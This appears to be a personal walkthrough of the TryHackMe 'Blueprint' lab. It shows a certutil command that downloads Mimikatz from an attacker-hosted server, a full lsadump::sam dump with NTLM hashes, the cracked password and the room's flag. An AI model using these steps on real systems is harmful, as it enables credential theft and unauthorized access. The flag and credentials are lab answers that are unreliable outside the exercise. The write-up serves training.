Will see the architecture of the system will run the below command

The system is x86
![[Pasted image 20230910214708.png]]

We have simply download the Mimikatz and will simply fire-up a server and download it in the windows
https://github.com/gentilkiwi/mimikatz/releases

I fired up the server in kali
python3 -m http.server 8080 -b 10.8.167. 78

Will simply download it
certutil.exe -urlcache -f http://10.8.167.78:8080/mimikatz.exe mimikatz.exe
![[Pasted image 20230910221552.png]]

Now simply start the Mimikatz
![[Pasted image 20230910221730.png]]

Run the command: lsadump::sam
![[Pasted image 20230910222004.png]]

mimikatz # lsadump::sam
Domain : BLUEPRINT
SysKey : 147a48de4a9815d2aa479598592b086f
Local SID : S-1-5-21-3130159037-241736515-3168549210

SAMKey : 3700ddba8f7165462130a4441ef47500

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 549a1bcb88e35dc18c7a0b0168631411

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Lab
  Hash NTLM: 30e87bf999828446a1c1209ddde4c450

Now we have to ![[Pasted image 20230910222500.png]]
hash 30e87bf999828446a1c1209ddde4c450
|Hash|Type|Result|
|---|---|---|
|30e87bf999828446a1c1209ddde4c450|NTLM|googleplus|

Now will will traverse to Users -> Administrator -> Desktop

![[Pasted image 20230910232227.png]]

THM{aea1e3ce6fe7f89e10cea833ae009bee}
